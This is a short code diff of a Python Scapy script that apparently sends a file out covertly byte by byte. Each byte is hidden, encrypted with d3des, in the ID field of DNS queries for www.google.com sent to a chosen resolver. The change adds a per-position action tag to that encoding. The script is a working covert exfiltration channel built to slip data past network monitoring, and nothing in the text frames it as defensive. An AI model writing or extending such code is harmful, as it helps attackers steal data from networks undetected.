@@ -35,7 +35,8 @@ pos = 0
 #send the file
 while pos <= file_size:
 	dns_sport = random.randrange(10000,60000,1) #random source port
-	dns_id = fread_lib.read_byte(pos) #read a byte @ pos
+	dns_id = fread_lib.read_byte(pos,file_size) #read a byte @ pos. it will also modify the action id based on pos and filze_size
+	dns_id = fread_lib.set_action(dns_id,pos,file_size)
 	dns_id = dnscc_lib.dnscc_crypt(dns_id,socket.htons(dns_sport),socket.htons(dns_dport),ip_to_uint32(args.client_ip),ip_to_uint32(args.dns_resolver_ip)) #encode the data into the dns id with d3des
 	send(IP(dst=args.dns_resolver_ip)/UDP(sport=dns_sport,dport=dns_dport)/DNS(id=dns_id,rd=1,qd=DNSQR(qname="www.google.com", qtype="A")));#send the packet
 	pos = pos + 1 # pos + 1 :)
